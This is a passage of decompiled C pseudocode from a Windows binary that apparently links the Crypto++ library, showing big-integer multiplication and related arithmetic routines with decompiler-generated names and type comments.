    sub_40891D((int)v10);
    v8 = (int)(this + 3);
    if ( sub_41128E(v7, v8) >= 0 )
      sub_40EF6C(v7, v8);
    return v7;
  }
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);
// 40F225: using guessed type char var_20[28];

//----- (0040F2D0) --------------------------------------------------------
int __thiscall sub_40F2D0(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[1] + 60))(this[1]);
}

//----- (0040F2D8) --------------------------------------------------------
char *__cdecl sub_40F2D8(void *a1, char *a2, void *Source, int a4, void *a5, int a6)
{
  _DWORD *v7; // edi
  char *v8; // ebp
  char *v9; // esi
  unsigned int v10; // edx
  unsigned int v11; // edx
  char *v12; // eax
  char *v13; // esi
  bool v14; // zf
  int v15; // edx
  unsigned int v16; // eax
  unsigned int v17; // esi
  int v18; // eax
  int v19; // eax
  int v20; // eax
  unsigned int v21; // eax
  int v23; // [esp+10h] [ebp-14h]
  char *v24; // [esp+14h] [ebp-10h]
  char *Destination; // [esp+18h] [ebp-Ch]
  unsigned int v26; // [esp+1Ch] [ebp-8h]
  char *v27; // [esp+20h] [ebp-4h]
  void *v28; // [esp+2Ch] [ebp+8h]
  char v29; // [esp+3Ch] [ebp+18h]

  v7 = a2;
  v24 = &a2[4 * a6];
  v8 = &a2[8 * a6];
  Destination = &a2[12 * a6];
  v26 = 2;
  v9 = 0;
  v23 = sub_411BB6((int)a5, a6);
  v29 = 0;
  if ( 3 * a6 )
  {
    memset(a2, 0, 12 * a6);
    v7 = a2;
  }
  *v7 = 1;
  sub_4113D1(v8, Source, a4);
  sub_4113D1(Destination, a5, a6);
  while ( 1 )
  {
    while ( 1 )
    {
      v11 = *(_DWORD *)v8;
      if ( !*(_DWORD *)v8 )
        break;
      _BitScanForward((unsigned int *)&v12, v11);
      v28 = v12;
      v13 = &v9[(_DWORD)v12];
      v14 = v11 >> (char)v12 == 1;
      v27 = v13;
      v15 = v23;
      if ( v14 && !*((_DWORD *)v8 + 1) && !sub_411BB6((int)(v8 + 8), v23 - 2) )
      {
        if ( v29 )
          off_48C068(a6, a1, a5, v7);
        else
          sub_4113D1(a1, v7, a6);
        return v13;
      }
      sub_41C1C2((int)v8, v15, (int)v28);
      v16 = sub_41C142((int)v24, v26, (int)v28);
      *(_DWORD *)&v24[4 * v26] += v16;
      v17 = v26 + 2 * (v16 != 0);
      v14 = sub_411259((int)v8, (int)Destination, v23) == -1;
      v29 ^= v14;
      v18 = 4 * v14 * ((v8 - Destination) >> 2);
      Destination += v18;
      v8 -= v18;
      v19 = 4 * v14 * (((char *)v7 - v24) >> 2);
      v24 += v19;
      v7 = (_DWORD *)((char *)v7 - v19);
      v23 -= *(_QWORD *)&v8[4 * v23 - 8] != 0i64 ? 0 : 2;
      off_48C068(v23, v8, v8, Destination);
      v20 = off_48C064(v7, v24);
      v7[v17] += v20;
      v21 = v17 + 2 * v20;
      v9 = v27;
      v26 = v21;
    }
    if ( !sub_411BB6((int)v8, v23) )
      break;
    sub_41C21A(v8, v10, 1u);
    v26 += *(_DWORD *)&v24[4 * v26 - 4] != 0 ? 2 : 0;
    sub_41C187(v24, v26, 1u);
    v9 += 32;
  }
  if ( a6 )
    memset(a1, 0, 4 * ((unsigned int)(4 * a6) >> 2));
  return 0;
}
// 40F368: variable 'v10' is possibly undefined
// 40F3D9: variable 'v15' is possibly undefined
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);
// 48C068: using guessed type int (__fastcall *off_48C068)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040F4DF) --------------------------------------------------------
char __cdecl sub_40F4DF(char *a1, int a2, int *a3)
{
  int v4; // [esp+10h] [ebp-24h] BYREF
  char v5[28]; // [esp+14h] [ebp-20h] BYREF
  int v6; // [esp+30h] [ebp-4h]

  if ( sub_4062C6(a1, (int)&CryptoPP::Integer `RTTI Type Descriptor') )
    return 0;
  sub_40E85C(&v4, *a3);
  v6 = 0;
  sub_40EC6C(a2, &v4);
  sub_40891D((int)v5);
  return 1;
}
// 40F4DF: using guessed type char var_20[28];

//----- (0040F52D) --------------------------------------------------------
int __cdecl sub_40F52D(
        unsigned int *Destination,
        int a2,
        unsigned int *Source,
        unsigned int a4,
        unsigned int *a5,
        unsigned int a6)
{
  unsigned int v6; // esi
  unsigned int v7; // edi
  unsigned __int64 v8; // rax
  unsigned int *v9; // ebp
  unsigned int *v10; // ecx
  unsigned int v11; // ebx
  unsigned int *v12; // ecx
  unsigned int v13; // esi
  int v14; // ebp
  unsigned int *v15; // edi
  unsigned __int64 v16; // rax
  int v17; // kr00_4
  bool v18; // zf
  int v19; // edx
  int v20; // eax
  int v21; // ebx
  int v22; // ebp
  unsigned int *v23; // ecx
  unsigned int *v24; // ecx
  int v25; // edx
  int v26; // eax
  int v27; // ebp
  int v28; // ecx
  unsigned int *v30; // [esp+8h] [ebp-10h]
  unsigned int v31; // [esp+10h] [ebp-8h]
  unsigned int v32; // [esp+14h] [ebp-4h]
  int v33; // [esp+14h] [ebp-4h]
  int v34; // [esp+14h] [ebp-4h]
  int v35; // [esp+28h] [ebp+10h]
  int v36; // [esp+28h] [ebp+10h]
  unsigned int v37; // [esp+28h] [ebp+10h]
  int v38; // [esp+30h] [ebp+18h]
  unsigned int *v39; // [esp+30h] [ebp+18h]
  unsigned int v40; // [esp+30h] [ebp+18h]

  v6 = a4;
  v7 = a6;
  if ( a4 == a6 )
  {
    if ( Source == a5 )
      LODWORD(v8) = sub_4130D8((int)Destination, a2, (int)Source, a4);
    else
      LODWORD(v8) = sub_412E84((int)Destination, a2, (int)Source, (int)a5, a4);
  }
  else
  {
    if ( a4 <= a6 )
    {
      v9 = a5;
      v10 = Source;
    }
    else
    {
      v9 = Source;
      v10 = a5;
      v6 = a6;
      v7 = a4;
      a6 = a4;
    }
    v11 = 0;
    v35 = (int)v10;
    if ( v6 != 2 || v10[1] )
    {
      if ( ((v7 / v6) & 1) != 0 )
      {
        if ( v7 )
        {
          v24 = Destination;
          v25 = (char *)v9 - (char *)Destination;
          v39 = Destination;
          do
          {
            sub_412E84((int)v24, a2, v35, (int)v24 + v25, v6);
            v11 += 2 * v6;
            v25 = (char *)v9 - (char *)Destination;
            v24 = &v39[2 * v6];
            v39 = v24;
          }
          while ( v11 < v7 );
        }
        v40 = v6;
        if ( v6 < v7 )
        {
          v26 = a2;
          v27 = (int)&v9[v6];
          v28 = a2 + 8 * v6;
          v34 = v28;
          do
          {
            sub_412E84(v28, v26, v35, v27, v6);
            v28 = 8 * v6 + v34;
            v27 += 8 * v6;
            v34 = v28;
            v40 += 2 * v6;
            v26 = a2;
          }
          while ( v40 < v7 );
        }
      }
      else
      {
        sub_412E84((int)Destination, a2, (int)v10, (int)v9, v6);
        v30 = &Destination[v6];
        sub_4113D1((void *)(a2 + 8 * v6), v30, v6);
        v31 = 2 * v6;
        if ( 2 * v6 >= v7 )
        {
          v21 = v35;
        }
        else
        {
          v19 = (int)&v9[2 * v6];
          v33 = v19;
          v20 = a2 + 12 * v6;
          v21 = v35;
          v38 = v20;
          do
          {
            sub_412E84(v20, a2, v35, v19, v6);
            v38 += 8 * v6;
            v19 = 8 * v6 + v33;
            v33 = v19;
            v31 += 2 * v6;
            v20 = v38;
          }
          while ( v31 < v7 );
        }
        v37 = v6;
        if ( v6 < v7 )
        {
          v22 = (char *)v9 - (char *)Destination;
          v23 = &Destination[v6];
          do
          {
            sub_412E84((int)v23, a2, v21, (int)v23 + v22, v6);
            v23 = &v30[2 * v6];
            v30 = v23;
            v37 += 2 * v6;
          }
          while ( v37 < v7 );
        }
      }
      LODWORD(v8) = off_48C064(&Destination[v6], a2 + 8 * v6);
      if ( (_DWORD)v8 )
        LODWORD(v8) = sub_411C95(&Destination[v7], v6, 1);
    }
    else
    {
      v32 = *v10;
      LODWORD(v8) = *v10;
      if ( *v10 )
      {
        LODWORD(v8) = v8 - 1;
        if ( (_DWORD)v8 )
        {
          v12 = Destination;
          v13 = 0;
          if ( v7 )
          {
            v14 = (char *)v9 - (char *)Destination;
            v36 = v7;
            v15 = Destination;
            do
            {
              v16 = v32 * (unsigned __int64)*(unsigned int *)((char *)v15 + v14);
              v17 = v32 * *(unsigned int *)((char *)v15 + v14);
              *v15++ = v13 + v17;
              v8 = __PAIR64__(HIDWORD(v16), v13) + (unsigned int)v17;
              v18 = v36-- == 1;
              v13 = HIDWORD(v8);
            }
            while ( !v18 );
            v7 = a6;
            v12 = Destination;
          }
          v12[v7] = v13;
          v12[v7 + 1] = 0;
        }
        else
        {
          LODWORD(v8) = sub_4113D1(Destination, v9, v7);
          Destination[v7 + 1] = 0;
          Destination[v7] = 0;
        }
      }
      else if ( v7 != -2 )
      {
        LODWORD(v8) = 0;
        memset(Destination, 0, 4 * (v7 + 2));
      }
    }
  }
  return v8;
}
// 48C064: using guessed type int (__stdcall *off_48C064)(_DWORD, _DWORD);

//----- (0040F7F8) --------------------------------------------------------
int __thiscall sub_40F7F8(void *this, int a2)
{
  unsigned int v3; // ebx
  int v4; // esi
  unsigned __int64 v5; // rax
  int v7; // [esp+0h] [ebp-48h]
  int v8; // [esp+4h] [ebp-44h]
  _DWORD v9[6]; // [esp+10h] [ebp-38h] BYREF
  char v10; // [esp+29h] [ebp-1Fh]
  unsigned int v11; // [esp+30h] [ebp-18h]
  int v12; // [esp+34h] [ebp-14h]
  int v13; // [esp+44h] [ebp-4h]

  sub_40AB80(v9, a2, 2);
  v13 = 0;
  if ( !v10 || (v3 = v11, v4 = v12, LODWORD(v5) = sub_40D6AB(v9), v5 < __PAIR64__(v4, v3)) )
    sub_40B054(v7, v8);
  sub_411463((int)this, (int)v9, v11, 1);
  sub_40B6AF((int)v9);
  return sub_40AC76(v9);
}
// 40F834: variable 'v5' is possibly undefined
// 40F85E: variable 'v7' is possibly undefined
// 40F85E: variable 'v8' is possibly undefined
// 40B054: using guessed type void __stdcall __noreturn sub_40B054(_DWORD, _DWORD);
// 40F7F8: using guessed type _DWORD var_38[6];

//----- (0040F864) --------------------------------------------------------
unsigned __int64 __cdecl sub_40F864(int a1, unsigned int *a2, unsigned int *a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // kr08_4
  __int64 v5; // kr10_8
  unsigned __int64 v6; // kr00_8
  unsigned __int64 v7; // kr18_8
  unsigned __int64 result; // rax

  v4 = *a3;
  v5 = *a2;
  v3 = ((unsigned __int64)*a3 * v5) >> 32;
  *(_DWORD *)a1 = *a3 * *a2;
  v6 = (v3 + a3[1] * (unsigned __int64)*a2) >> 32;
  v7 = *a3 * (unsigned __int64)a2[1] + ((__PAIR64__(a3[1], v4) * v5) >> 32);
  *(_DWORD *)(a1 + 4) = v7;
  result = v6 + HIDWORD(v7) + a3[1] * (unsigned __int64)a2[1];
  *(_QWORD *)(a1 + 8) = result;
  return result;
}

//----- (0040F8C7) --------------------------------------------------------
unsigned __int64 __cdecl sub_40F8C7(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  __int64 v3; // kr08_8
  __int64 v4; // krA0_8
  unsigned int v5; // esi
  unsigned __int64 v6; // kr20_8
  unsigned int v7; // esi
  unsigned int v8; // ebx
  unsigned int v9; // edi
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // kr38_8
  unsigned int v12; // esi
  unsigned __int64 v13; // kr48_8
  int v14; // esi
  unsigned __int64 v15; // kr58_8
  unsigned int v16; // ebx
  unsigned int v17; // edi
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // kr80_8
  unsigned int v20; // ebx
  unsigned int v21; // edi
  unsigned __int64 v22; // kr98_8
  unsigned __int64 v23; // rax
  int v24; // kr00_4
  unsigned __int64 result; // rax

  v3 = *a3;
  v4 = *a2;
  *a1 = *a3 * *a2;
  v5 = (__PAIR64__(a3[1], v3) * v4) >> 32;
  v6 = ((((unsigned __int64)(v3 * v4) >> 32) + a3[1] * (unsigned __int64)*a2) >> 32)
     + ((v5 + *a3 * (unsigned __int64)a2[1]) >> 32);
  a1[1] = v5 + *a3 * a2[1];
  v7 = v6 + a3[2] * *a2;
  v8 = ((((unsigned int)v6 + a3[2] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v6)
      + ((a3[1] * (unsigned __int64)a2[1] + v7) >> 32)) >> 32;
  v9 = (((unsigned int)v6 + a3[2] * (unsigned __int64)*a2) >> 32)
     + HIDWORD(v6)
     + ((a3[1] * (unsigned __int64)a2[1] + v7) >> 32);
  v10 = a3[1] * a2[1] + v7 + *a3 * (unsigned __int64)a2[2];
  a1[2] = v10;
  v11 = __PAIR64__(v8, HIDWORD(v10)) + v9;
  v12 = v11 + a3[3] * *a2;
  v13 = ((v12 + a3[2] * (unsigned __int64)a2[1]) >> 32)
      + (((unsigned int)v11 + a3[3] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v11);
  HIDWORD(v10) = (a3[1] * (unsigned __int64)a2[2] + v12 + a3[2] * a2[1]) >> 32;
  v14 = a3[1] * a2[2] + v12 + a3[2] * a2[1];
  v15 = HIDWORD(v10) + v13 + (((unsigned int)v14 + *a3 * (unsigned __int64)a2[3]) >> 32);
  a1[3] = v14 + *a3 * a2[3];
  v16 = ((((unsigned int)v15 + a3[3] * (unsigned __int64)a2[1]) >> 32)
       + HIDWORD(v15)
       + ((a3[2] * (unsigned __int64)a2[2] + (unsigned int)v15 + a3[3] * a2[1]) >> 32)) >> 32;
  v17 = (((unsigned int)v15 + a3[3] * (unsigned __int64)a2[1]) >> 32)
      + HIDWORD(v15)
      + ((a3[2] * (unsigned __int64)a2[2] + (unsigned int)v15 + a3[3] * a2[1]) >> 32);
  v18 = a3[2] * a2[2] + (_DWORD)v15 + a3[3] * a2[1] + a3[1] * (unsigned __int64)a2[3];
  a1[4] = v18;
  v19 = __PAIR64__(v16, HIDWORD(v18)) + v17;
  v21 = ((((unsigned int)v19 + a3[3] * (unsigned __int64)a2[2]) >> 32) + HIDWORD(v19)) >> 32;
  v20 = (((unsigned int)v19 + a3[3] * (unsigned __int64)a2[2]) >> 32) + HIDWORD(v19);
  v22 = a3[2] * (unsigned __int64)a2[3] + (unsigned int)v19 + a3[3] * a2[2];
  a1[5] = v22;
  v23 = HIDWORD(v22) + a3[3] * (unsigned __int64)a2[3];
  v24 = HIDWORD(v22) + a3[3] * a2[3];
  a1[6] = v20 + v24;
  result = __PAIR64__(HIDWORD(v23), v20) + __PAIR64__(v21, v24);
  a1[7] = HIDWORD(result);
  return result;
}

//----- (0040FA2E) --------------------------------------------------------
unsigned __int64 __cdecl sub_40FA2E(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  __int64 v3; // kr08_8
  __int64 v4; // kr2C0_8
  unsigned int v5; // esi
  unsigned __int64 v6; // kr18_8
  unsigned int v7; // esi
  unsigned int v8; // ebx
  unsigned int v9; // edi
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // kr48_8
  unsigned int v12; // esi
  unsigned __int64 v13; // kr68_8
  int v14; // esi
  unsigned __int64 v15; // kr78_8
  unsigned int v16; // ecx
  unsigned int v17; // ebx
  unsigned int v18; // edi
  unsigned __int64 v19; // rax
  unsigned __int64 v20; // krA8_8
  unsigned int v21; // esi
  unsigned __int64 v22; // krD8_8
  int v23; // esi
  unsigned __int64 v24; // krE8_8
  unsigned int v25; // ecx
  unsigned int v26; // ebx
  unsigned int v27; // edi
  unsigned __int64 v28; // rax
  unsigned __int64 v29; // kr138_8
  unsigned int v30; // esi
  unsigned __int64 v31; // kr188_8
  int v32; // esi
  unsigned __int64 v33; // kr198_8
  unsigned int v34; // ecx
  unsigned int v35; // ebx
  unsigned int v36; // edi
  unsigned __int64 v37; // rax
  unsigned __int64 v38; // kr1E8_8
  unsigned int v39; // esi
  unsigned __int64 v40; // kr218_8
  int v41; // esi
  unsigned __int64 v42; // kr228_8
  unsigned int v43; // ecx
  unsigned int v44; // ebx
  unsigned int v45; // edi
  unsigned __int64 v46; // rax
  unsigned __int64 v47; // kr258_8
  unsigned int v48; // esi
  unsigned __int64 v49; // kr268_8
  int v50; // esi
  unsigned __int64 v51; // kr278_8
  unsigned int v52; // ebx
  unsigned int v53; // edi
  unsigned __int64 v54; // rax
  unsigned __int64 v55; // kr2A0_8
  unsigned int v56; // ebx
  unsigned int v57; // edi
  unsigned __int64 v58; // kr2B8_8
  unsigned __int64 v59; // rax
  int v60; // kr00_4
  unsigned __int64 result; // rax

  v3 = *a3;
  v4 = *a2;
  *a1 = *a3 * *a2;
  v5 = (__PAIR64__(a3[1], v3) * v4) >> 32;
  v6 = ((((unsigned __int64)(v3 * v4) >> 32) + a3[1] * (unsigned __int64)*a2) >> 32)
     + ((v5 + *a3 * (unsigned __int64)a2[1]) >> 32);
  a1[1] = v5 + *a3 * a2[1];
  v7 = v6 + a3[2] * *a2;
  v8 = ((((unsigned int)v6 + a3[2] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v6)
      + ((a3[1] * (unsigned __int64)a2[1] + v7) >> 32)) >> 32;
  v9 = (((unsigned int)v6 + a3[2] * (unsigned __int64)*a2) >> 32)
     + HIDWORD(v6)
     + ((a3[1] * (unsigned __int64)a2[1] + v7) >> 32);
  v10 = a3[1] * a2[1] + v7 + *a3 * (unsigned __int64)a2[2];
  a1[2] = v10;
  v11 = __PAIR64__(v8, HIDWORD(v10)) + v9;
  v12 = v11 + a3[3] * *a2;
  v13 = ((v12 + a3[2] * (unsigned __int64)a2[1]) >> 32)
      + (((unsigned int)v11 + a3[3] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v11);
  HIDWORD(v10) = (a3[1] * (unsigned __int64)a2[2] + v12 + a3[2] * a2[1]) >> 32;
  v14 = a3[1] * a2[2] + v12 + a3[2] * a2[1];
  v15 = HIDWORD(v10) + v13 + (((unsigned int)v14 + *a3 * (unsigned __int64)a2[3]) >> 32);
  a1[3] = v14 + *a3 * a2[3];
  v16 = v15 + a3[4] * *a2 + a3[3] * a2[1];
  v17 = (((v16 + a3[2] * (unsigned __int64)a2[2]) >> 32)
       + (((unsigned int)v15 + a3[4] * *a2 + a3[3] * (unsigned __int64)a2[1]) >> 32)
       + (((unsigned int)v15 + a3[4] * (unsigned __int64)*a2) >> 32)
       + HIDWORD(v15)
       + ((a3[1] * (unsigned __int64)a2[3] + v16 + a3[2] * a2[2]) >> 32)) >> 32;
  v18 = ((v16 + a3[2] * (unsigned __int64)a2[2]) >> 32)
      + (((unsigned int)v15 + a3[4] * *a2 + a3[3] * (unsigned __int64)a2[1]) >> 32)
      + (((unsigned int)v15 + a3[4] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v15)
      + ((a3[1] * (unsigned __int64)a2[3] + v16 + a3[2] * a2[2]) >> 32);
  v19 = a3[1] * a2[3] + v16 + a3[2] * a2[2] + *a3 * (unsigned __int64)a2[4];
  a1[4] = v19;
  v20 = __PAIR64__(v17, HIDWORD(v19)) + v18;
  v21 = v20 + a3[5] * *a2 + a3[4] * a2[1] + a3[3] * a2[2];
  v22 = ((v21 + a3[2] * (unsigned __int64)a2[3]) >> 32)
      + (((_DWORD)v20 + a3[5] * *a2 + a3[4] * a2[1] + a3[3] * (unsigned __int64)a2[2]) >> 32)
      + (((unsigned int)v20 + a3[5] * *a2 + a3[4] * (unsigned __int64)a2[1]) >> 32)
      + (((unsigned int)v20 + a3[5] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v20);
  HIDWORD(v19) = (a3[1] * (unsigned __int64)a2[4] + v21 + a3[2] * a2[3]) >> 32;
  v23 = a3[1] * a2[4] + v21 + a3[2] * a2[3];
  v24 = HIDWORD(v19) + v22 + (((unsigned int)v23 + *a3 * (unsigned __int64)a2[5]) >> 32);
  a1[5] = v23 + *a3 * a2[5];
  v25 = v24 + a3[6] * *a2 + a3[5] * a2[1] + a3[4] * a2[2] + a3[3] * a2[3];
  v26 = (((v25 + a3[2] * (unsigned __int64)a2[4]) >> 32)
       + (((_DWORD)v24 + a3[6] * *a2 + a3[5] * a2[1] + a3[4] * a2[2] + a3[3] * (unsigned __int64)a2[3]) >> 32)
       + (((_DWORD)v24 + a3[6] * *a2 + a3[5] * a2[1] + a3[4] * (unsigned __int64)a2[2]) >> 32)
       + (((unsigned int)v24 + a3[6] * *a2 + a3[5] * (unsigned __int64)a2[1]) >> 32)
       + (((unsigned int)v24 + a3[6] * (unsigned __int64)*a2) >> 32)
       + HIDWORD(v24)
       + ((a3[1] * (unsigned __int64)a2[5] + v25 + a3[2] * a2[4]) >> 32)) >> 32;
  v27 = ((v25 + a3[2] * (unsigned __int64)a2[4]) >> 32)
      + (((_DWORD)v24 + a3[6] * *a2 + a3[5] * a2[1] + a3[4] * a2[2] + a3[3] * (unsigned __int64)a2[3]) >> 32)
      + (((_DWORD)v24 + a3[6] * *a2 + a3[5] * a2[1] + a3[4] * (unsigned __int64)a2[2]) >> 32)
      + (((unsigned int)v24 + a3[6] * *a2 + a3[5] * (unsigned __int64)a2[1]) >> 32)
      + (((unsigned int)v24 + a3[6] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v24)
      + ((a3[1] * (unsigned __int64)a2[5] + v25 + a3[2] * a2[4]) >> 32);
  v28 = a3[1] * a2[5] + v25 + a3[2] * a2[4] + *a3 * (unsigned __int64)a2[6];
  a1[6] = v28;
  v29 = __PAIR64__(v26, HIDWORD(v28)) + v27;
  v30 = v29 + a3[7] * *a2 + a3[6] * a2[1] + a3[5] * a2[2] + a3[4] * a2[3] + a3[3] * a2[4];
  v31 = ((v30 + a3[2] * (unsigned __int64)a2[5]) >> 32)
      + (((_DWORD)v29 + a3[7] * *a2 + a3[6] * a2[1] + a3[5] * a2[2] + a3[4] * a2[3] + a3[3] * (unsigned __int64)a2[4]) >> 32)
      + (((_DWORD)v29 + a3[7] * *a2 + a3[6] * a2[1] + a3[5] * a2[2] + a3[4] * (unsigned __int64)a2[3]) >> 32)
      + (((_DWORD)v29 + a3[7] * *a2 + a3[6] * a2[1] + a3[5] * (unsigned __int64)a2[2]) >> 32)
      + (((unsigned int)v29 + a3[7] * *a2 + a3[6] * (unsigned __int64)a2[1]) >> 32)
      + (((unsigned int)v29 + a3[7] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v29);
  HIDWORD(v28) = (a3[1] * (unsigned __int64)a2[6] + v30 + a3[2] * a2[5]) >> 32;
  v32 = a3[1] * a2[6] + v30 + a3[2] * a2[5];
  v33 = HIDWORD(v28) + v31 + (((unsigned int)v32 + *a3 * (unsigned __int64)a2[7]) >> 32);
  a1[7] = v32 + *a3 * a2[7];
  v34 = v33 + a3[7] * a2[1] + a3[6] * a2[2] + a3[5] * a2[3] + a3[4] * a2[4];
  v35 = (((v34 + a3[3] * (unsigned __int64)a2[5]) >> 32)
       + (((_DWORD)v33 + a3[7] * a2[1] + a3[6] * a2[2] + a3[5] * a2[3] + a3[4] * (unsigned __int64)a2[4]) >> 32)
       + (((_DWORD)v33 + a3[7] * a2[1] + a3[6] * a2[2] + a3[5] * (unsigned __int64)a2[3]) >> 32)
       + (((unsigned int)v33 + a3[7] * a2[1] + a3[6] * (unsigned __int64)a2[2]) >> 32)
       + (((unsigned int)v33 + a3[7] * (unsigned __int64)a2[1]) >> 32)
       + HIDWORD(v33)
       + ((a3[2] * (unsigned __int64)a2[6] + v34 + a3[3] * a2[5]) >> 32)) >> 32;
  v36 = ((v34 + a3[3] * (unsigned __int64)a2[5]) >> 32)
      + (((_DWORD)v33 + a3[7] * a2[1] + a3[6] * a2[2] + a3[5] * a2[3] + a3[4] * (unsigned __int64)a2[4]) >> 32)
      + (((_DWORD)v33 + a3[7] * a2[1] + a3[6] * a2[2] + a3[5] * (unsigned __int64)a2[3]) >> 32)
      + (((unsigned int)v33 + a3[7] * a2[1] + a3[6] * (unsigned __int64)a2[2]) >> 32)
      + (((unsigned int)v33 + a3[7] * (unsigned __int64)a2[1]) >> 32)
      + HIDWORD(v33)
      + ((a3[2] * (unsigned __int64)a2[6] + v34 + a3[3] * a2[5]) >> 32);
  v37 = a3[2] * a2[6] + v34 + a3[3] * a2[5] + a3[1] * (unsigned __int64)a2[7];
  a1[8] = v37;
  v38 = __PAIR64__(v35, HIDWORD(v37)) + v36;
  v39 = v38 + a3[7] * a2[2] + a3[6] * a2[3] + a3[5] * a2[4];
  v40 = ((v39 + a3[4] * (unsigned __int64)a2[5]) >> 32)
      + (((_DWORD)v38 + a3[7] * a2[2] + a3[6] * a2[3] + a3[5] * (unsigned __int64)a2[4]) >> 32)
      + (((unsigned int)v38 + a3[7] * a2[2] + a3[6] * (unsigned __int64)a2[3]) >> 32)
      + (((unsigned int)v38 + a3[7] * (unsigned __int64)a2[2]) >> 32)
      + HIDWORD(v38);
  HIDWORD(v37) = (a3[3] * (unsigned __int64)a2[6] + v39 + a3[4] * a2[5]) >> 32;
  v41 = a3[3] * a2[6] + v39 + a3[4] * a2[5];
  v42 = HIDWORD(v37) + v40 + (((unsigned int)v41 + a3[2] * (unsigned __int64)a2[7]) >> 32);
  a1[9] = v41 + a3[2] * a2[7];
  v43 = v42 + a3[7] * a2[3] + a3[6] * a2[4];
  v44 = (((v43 + a3[5] * (unsigned __int64)a2[5]) >> 32)
       + (((unsigned int)v42 + a3[7] * a2[3] + a3[6] * (unsigned __int64)a2[4]) >> 32)
       + (((unsigned int)v42 + a3[7] * (unsigned __int64)a2[3]) >> 32)
       + HIDWORD(v42)
       + ((a3[4] * (unsigned __int64)a2[6] + v43 + a3[5] * a2[5]) >> 32)) >> 32;
  v45 = ((v43 + a3[5] * (unsigned __int64)a2[5]) >> 32)
      + (((unsigned int)v42 + a3[7] * a2[3] + a3[6] * (unsigned __int64)a2[4]) >> 32)
      + (((unsigned int)v42 + a3[7] * (unsigned __int64)a2[3]) >> 32)
      + HIDWORD(v42)
      + ((a3[4] * (unsigned __int64)a2[6] + v43 + a3[5] * a2[5]) >> 32);
  v46 = a3[4] * a2[6] + v43 + a3[5] * a2[5] + a3[3] * (unsigned __int64)a2[7];
  a1[10] = v46;
  v47 = __PAIR64__(v44, HIDWORD(v46)) + v45;
  v48 = v47 + a3[7] * a2[4];
  v49 = ((v48 + a3[6] * (unsigned __int64)a2[5]) >> 32)
      + (((unsigned int)v47 + a3[7] * (unsigned __int64)a2[4]) >> 32)
      + HIDWORD(v47);
  HIDWORD(v46) = (a3[5] * (unsigned __int64)a2[6] + v48 + a3[6] * a2[5]) >> 32;
  v50 = a3[5] * a2[6] + v48 + a3[6] * a2[5];
  v51 = HIDWORD(v46) + v49 + (((unsigned int)v50 + a3[4] * (unsigned __int64)a2[7]) >> 32);
  a1[11] = v50 + a3[4] * a2[7];
  v52 = ((((unsigned int)v51 + a3[7] * (unsigned __int64)a2[5]) >> 32)
       + HIDWORD(v51)
       + ((a3[6] * (unsigned __int64)a2[6] + (unsigned int)v51 + a3[7] * a2[5]) >> 32)) >> 32;
  v53 = (((unsigned int)v51 + a3[7] * (unsigned __int64)a2[5]) >> 32)
      + HIDWORD(v51)
      + ((a3[6] * (unsigned __int64)a2[6] + (unsigned int)v51 + a3[7] * a2[5]) >> 32);
  v54 = a3[6] * a2[6] + (_DWORD)v51 + a3[7] * a2[5] + a3[5] * (unsigned __int64)a2[7];
  a1[12] = v54;
  v55 = __PAIR64__(v52, HIDWORD(v54)) + v53;
  v57 = ((((unsigned int)v55 + a3[7] * (unsigned __int64)a2[6]) >> 32) + HIDWORD(v55)) >> 32;
  v56 = (((unsigned int)v55 + a3[7] * (unsigned __int64)a2[6]) >> 32) + HIDWORD(v55);
  v58 = a3[6] * (unsigned __int64)a2[7] + (unsigned int)v55 + a3[7] * a2[6];
  a1[13] = v58;
  v59 = HIDWORD(v58) + a3[7] * (unsigned __int64)a2[7];
  v60 = HIDWORD(v58) + a3[7] * a2[7];
  a1[14] = v56 + v60;
  result = __PAIR64__(HIDWORD(v59), v56) + __PAIR64__(v57, v60);
  a1[15] = HIDWORD(result);
  return result;
}

//----- (0040FFAD) --------------------------------------------------------
int __cdecl sub_40FFAD(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  unsigned __int64 v3; // rax
  int result; // eax

  v3 = *a3 * (unsigned __int64)*a2;
  *a1 = v3;
  result = *a3 * a2[1];
  a1[1] = HIDWORD(v3) + result + *a2 * a3[1];
  return result;
}

//----- (0040FFD9) --------------------------------------------------------
int __cdecl sub_40FFD9(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  __int64 v3; // rax
  unsigned int v4; // kr20_4
  __int64 v5; // kr28_8
  int v6; // kr08_4
  unsigned __int64 v7; // rcx
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // rcx
  unsigned __int64 v10; // kr10_8
  unsigned __int64 v11; // kr18_8
  unsigned __int64 v12; // rax
  int result; // eax

  v4 = *a3;
  v5 = *a2;
  v3 = *a3 * v5;
  *a1 = v3;
  v6 = (__PAIR64__(a3[1], v4) * v5) >> 32;
  v7 = (HIDWORD(v3) + a3[1] * (unsigned __int64)*a2) >> 32;
  v8 = *a3 * (unsigned __int64)a2[1];
  a1[1] = v6 + v8;
  v9 = (unsigned int)__CFADD__(v6, (_DWORD)v8) + HIDWORD(v8) + v7;
  v10 = __PAIR64__((*(unsigned int *)(*a3 * a2[2]) * (unsigned __int64)a2[2]) >> 32, v9) + *a3 * a2[2];
  v11 = (unsigned int)v10 + a3[1] * (unsigned __int64)a2[1];
  v12 = a3[2] * (unsigned __int64)*a2;
  a1[2] = v11 + v12;
  HIDWORD(v12) += __CFADD__((_DWORD)v11, (_DWORD)v12);
